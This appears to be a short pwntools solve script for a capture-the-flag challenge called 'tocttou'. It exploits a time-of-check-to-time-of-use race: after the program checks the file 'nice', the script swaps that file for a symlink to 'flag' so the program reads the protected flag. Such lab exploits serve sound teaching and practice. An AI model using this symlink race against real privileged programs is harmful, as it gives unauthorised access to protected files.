#!/usr/bin/env python
from pwn import *
import os

p = process("./tocttou")
p.recv()
p.sendline("nice")
p.recvuntil("Processing.")

os.unlink("nice")
os.symlink("flag", "nice")

#print(p.recv())
p.interactive()
